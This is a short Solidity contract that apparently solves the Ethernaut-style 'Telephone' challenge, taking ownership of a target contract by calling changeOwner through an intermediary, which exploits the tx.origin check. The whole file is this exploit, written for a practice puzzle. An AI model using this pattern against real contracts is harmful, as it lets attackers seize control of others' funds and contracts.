// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Solve {
    function run(address _address, address player) public {
        Telephone target = Telephone(_address);
        target.changeOwner(player);
    }
}